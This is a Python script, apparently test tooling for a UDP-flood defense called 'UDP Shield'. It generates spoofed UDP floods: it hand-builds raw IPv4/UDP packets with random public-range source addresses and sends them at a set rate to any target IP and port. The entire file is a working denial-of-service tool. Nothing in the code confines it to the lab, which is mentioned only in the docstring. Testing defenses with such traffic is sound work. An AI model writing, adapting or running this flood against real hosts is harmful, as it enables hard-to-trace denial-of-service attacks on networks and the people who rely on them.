#!/usr/bin/env python3
"""
spoofed_flood.py
High-rate spoofed UDP flood generator for UDP Shield testbed.

Usage (inside ns_attacker):
  sudo ip netns exec ns_attacker python3 spoofed_flood.py \
      --target 10.200.1.2 --port 54321 --pps 50000 --duration 10
"""

import argparse, os, random, socket, struct, time

parser = argparse.ArgumentParser()
parser.add_argument("--target", required=True)
parser.add_argument("--port", type=int, required=True)
parser.add_argument("--pps", type=int, default=10000)
parser.add_argument("--duration", type=int, default=10)
args = parser.parse_args()

# Build IPv4 + UDP headers manually
def ip_header(src_ip, dst_ip, payload_len):
    ver_ihl = 0x45
    tos = 0
    tot_len = 20 + 8 + payload_len
    ident = random.randint(0, 65535)
    flags_frag = 0
    ttl = 64
    proto = socket.IPPROTO_UDP
    checksum = 0

    s_ip = struct.unpack("!I", socket.inet_aton(src_ip))[0]
    d_ip = struct.unpack("!I", socket.inet_aton(dst_ip))[0]

    hdr = struct.pack("!BBHHHBBHII", ver_ihl, tos, tot_len, ident,
                       flags_frag, ttl, proto, checksum, s_ip, d_ip)
    return hdr

def udp_header(src_port, dst_port, payload_len):
    length = 8 + payload_len
    checksum = 0
    return struct.pack("!HHHH", src_port, dst_port, length, checksum)

def random_ip():
    # pick a random spoofed source IP from public ranges
    return f"{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}"

def build_packet(dst_ip, dst_port):
    payload = b"X" * 32
    src_ip = random_ip()
    src_port = random.randint(1024, 65535)

    iph = ip_header(src_ip, dst_ip, len(payload))
    udph = udp_header(src_port, dst_port, len(payload))
    return src_ip, iph + udph + payload

def main():
    if os.geteuid() != 0:
        print("ERROR: must run as root (sudo)")
        exit(1)

    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    interval = 1.0 / max(args.pps, 1)
    end_time = time.time() + args.duration
    sent = 0

    try:
        while time.time() < end_time:
            src_ip, pkt = build_packet(args.target, args.port)
            raw_sock.sendto(pkt, (args.target, 0))
            sent += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    finally:
        print("Sent spoofed packets:", sent)

if __name__ == "__main__":
    main()
